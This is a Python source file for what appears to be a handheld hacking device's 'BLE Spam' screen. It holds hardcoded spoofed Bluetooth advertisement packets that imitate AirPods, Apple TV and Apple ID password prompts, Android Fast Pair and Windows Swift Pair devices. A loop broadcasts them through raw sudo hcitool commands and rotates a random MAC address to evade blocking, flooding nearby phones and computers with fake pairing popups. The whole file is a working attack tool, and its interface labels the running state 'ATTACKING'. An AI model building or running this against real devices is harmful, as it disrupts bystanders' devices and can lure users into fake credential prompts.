"""BLE Spam — Advanced spoofing for Apple/Android/Windows pairing popups."""
from __future__ import annotations

import os
import subprocess
import socket
import struct
import threading
import time
import random
from typing import TYPE_CHECKING

import pygame
from bigbox import theme
from bigbox.events import Button, ButtonEvent

if TYPE_CHECKING:
    from bigbox.app import App


# BLE Advertisement Packets (AppleJuice, Fast Pair, Swift Pair)
# Format: [Flags] [Manufacturer Specific Data]
# Apple Company ID: 0x004c (4c 00)
# Flags: 02 01 06 (General Discoverable)
PROFILES = [
    ("AirPods Pro", b"\x02\x01\x06\x1a\xff\x4c\x00\x07\x19\x07\x02\x20\x75\xaa\x30\x01\x00\x00\x45\x12\x12\x12\x12\x12\x12\x12\x12\x12\x12\x12\x12"),
    ("AirPods Max", b"\x02\x01\x06\x1a\xff\x4c\x00\x07\x19\x07\x02\x20\x75\xaa\x30\x01\x00\x00\x4a\x12\x12\x12\x12\x12\x12\x12\x12\x12\x12\x12\x12"),
    ("Powerbeats Pro", b"\x02\x01\x06\x1a\xff\x4c\x00\x07\x19\x07\x02\x20\x75\xaa\x30\x01\x00\x00\x4b\x12\x12\x12\x12\x12\x12\x12\x12\x12\x12\x12\x12"),
    ("Apple TV Setup", b"\x02\x01\x06\x1a\xff\x4c\x00\x07\x19\x07\x02\x20\x75\xaa\x30\x01\x00\x00\x44\x12\x12\x12\x12\x12\x12\x12\x12\x12\x12\x12\x12"),
    ("Apple ID Password", b"\x02\x01\x06\x1a\xff\x4c\x00\x07\x19\x07\x02\x20\x75\xaa\x30\x01\x00\x00\x53\x12\x12\x12\x12\x12\x12\x12\x12\x12\x12\x12\x12"),
    ("Android Fast Pair", b"\x02\x01\x06\x03\x03\x2d\xfe\x06\x16\x2d\xfe\x00\x00\x00\x00\x12\x12\x12\x12\x12\x12\x12\x12\x12\x12\x12\x12\x12\x12\x12\x12"),
    ("Windows Swift Pair", b"\x02\x01\x06\x03\x03\x00\xfe\x16\x16\x00\xfe\x00\x00\x00\x00\x12\x12\x12\x12\x12\x12\x12\x12\x12\x12\x12\x12\x12\x12\x12\x12"),
    ("Kitchen Sink (All)", b"ALL"),
]


class BLESpamView:
    def __init__(self) -> None:
        self.dismissed = False
        self.running = False
        self.cursor = 0
        self.error_msg = ""
        self.packets_sent = 0
        self.iface_idx = 0
        self.interfaces = ["hci0", "hci1"]
        
        self._stop_event = threading.Event()
        self._spam_thread: threading.Thread | None = None
        
        self.title_font = pygame.font.Font(None, 36)
        self.body_font = pygame.font.Font(None, 24)

    def handle(self, ev: ButtonEvent, ctx: App) -> None:
        if not ev.pressed: return

        if ev.button is Button.B:
            self._stop()
            self.dismissed = True
        elif ev.button is Button.UP and not self.running:
            self.cursor = (self.cursor - 1) % len(PROFILES)
        elif ev.button is Button.DOWN and not self.running:
            self.cursor = (self.cursor + 1) % len(PROFILES)
        elif ev.button is Button.X and not self.running:
            self.iface_idx = (self.iface_idx + 1) % len(self.interfaces)
        elif ev.button is Button.A:
            if self.running:
                self._stop()
            else:
                self._start()

    def _start(self):
        self.running = True
        self.error_msg = ""
        self.packets_sent = 0
        self._stop_event.clear()
        self._spam_thread = threading.Thread(target=self._spam_loop, daemon=True)
        self._spam_thread.start()

    def _stop(self):
        self._stop_event.set()
        if self._spam_thread:
            self._spam_thread.join(timeout=1.0)
        self.running = False

    def _spam_loop(self):
        try:
            iface = self.interfaces[self.iface_idx]
            # 1. Bring interface up and stop advertising
            subprocess.run(["sudo", "hciconfig", iface, "up"], capture_output=True)
            subprocess.run(["sudo", "hcitool", "-i", iface, "cmd", "0x08", "0x000a", "00"], capture_output=True)
            time.sleep(0.2)

            # 2. Set Advertising Parameters (100ms interval, stable)
            # a0 00 = 160 * 0.625ms = 100ms
            subprocess.run(["sudo", "hcitool", "-i", iface, "cmd", "0x08", "0x0006", "a0", "00", "a0", "00", "03", "00", "00", "00", "00", "00", "00", "00", "00", "07", "00"], capture_output=True)

            while not self._stop_event.is_set():
                # Randomize MAC every 30 packets
                if self.packets_sent % 30 == 0:
                    subprocess.run(["sudo", "hcitool", "-i", iface, "cmd", "0x08", "0x000a", "00"], capture_output=True)
                    mac = [random.randint(0, 255) for _ in range(6)]
                    mac[0] |= 0xC0
                    mac_str = " ".join(f"{b:02x}" for b in mac)
                    subprocess.run(["sudo", "hcitool", "-i", iface, "cmd", "0x08", "0x0005"] + mac_str.split(), capture_output=True)
                    subprocess.run(["sudo", "hcitool", "-i", iface, "cmd", "0x08", "0x000a", "01"], capture_output=True)

                # Select data
                _, profile_data = PROFILES[self.cursor]
                if profile_data == b"ALL":
                    actual_profiles = [p for p in PROFILES if p[1] != b"ALL"]
                    profile_data = random.choice(actual_profiles)[1]

                # 3. Set Advertising Data
                # Full 32-byte packet: [Total Length] [Data...]
                hex_data = " ".join(f"{b:02x}" for b in profile_data)
                pad_count = 31 - len(profile_data)
                if pad_count > 0:
                    hex_data += " " + " ".join(["00"] * pad_count)
                
                # Length of the ADV data section (usually 1e for 31 bytes)
                cmd = ["sudo", "hcitool", "-i", iface, "cmd", "0x08", "0x0008", "1f"] + hex_data.split()
                subprocess.run(cmd, capture_output=True)
                
                # Start
                subprocess.run(["sudo", "hcitool", "-i", iface, "cmd", "0x08", "0x000a", "01"], capture_output=True)
                
                self.packets_sent += 1
                time.sleep(0.2)

            # Cleanup
            subprocess.run(["sudo", "hcitool", "-i", iface, "cmd", "0x08", "0x000a", "00"], capture_output=True)

        except Exception as e:
            self.error_msg = f"Shell Error: {e}"
            self.running = False

    def _hci_send_cmd(self, sock, ogf, ocf, data):
        pass # No longer used but kept to avoid errors elsewhere if any

    def render(self, surf: pygame.Surface) -> None:
        surf.fill(theme.BG)
        
        title = self.title_font.render("BLE SPAM :: ULTIMATE_SPOOF", True, theme.ACCENT)
        surf.blit(title, (theme.PADDING, theme.PADDING))

        status_text = f"STATUS: ATTACKING ({self.packets_sent})" if self.running else "STATUS: READY"
        status_color = theme.ERR if self.running else theme.FG
        s_surf = self.body_font.render(status_text, True, status_color)
        surf.blit(s_surf, (theme.PADDING, 60))

        iface_text = f"IFACE: {self.interfaces[self.iface_idx]}"
        if_surf = self.body_font.render(iface_text, True, theme.ACCENT)
        surf.blit(if_surf, (theme.SCREEN_W - theme.PADDING - if_surf.get_width(), 60))

        if self.error_msg:
            e_surf = self.body_font.render(self.error_msg, True, theme.ERR)
            surf.blit(e_surf, (theme.PADDING, 90))

        # Visual indicator
        if self.running:
            scan_x = (int(time.time() * 400) % (theme.SCREEN_W - 40)) + 20
            pygame.draw.line(surf, theme.ACCENT, (scan_x, 100), (scan_x, 110), 4)

        # Profile List
        list_y = 120
        for i, (name, _) in enumerate(PROFILES):
            y = list_y + i * 30
            if y > theme.SCREEN_H - 80: break
            
            color = theme.ACCENT if i == self.cursor else theme.FG_DIM
            if i == self.cursor and not self.running:
                pygame.draw.rect(surf, theme.SELECTION_BG, (theme.PADDING, y-4, 300, 26), border_radius=4)
            
            p_surf = self.body_font.render(f"[{'*' if self.running and i == self.cursor else ' '}] {name}", True, color)
            surf.blit(p_surf, (theme.PADDING + 10, y))

        hint = self.body_font.render("A: Toggle Attack  X: Cycle Iface  B: Back", True, theme.FG_DIM)
        surf.blit(hint, (theme.PADDING, theme.SCREEN_H - 30))
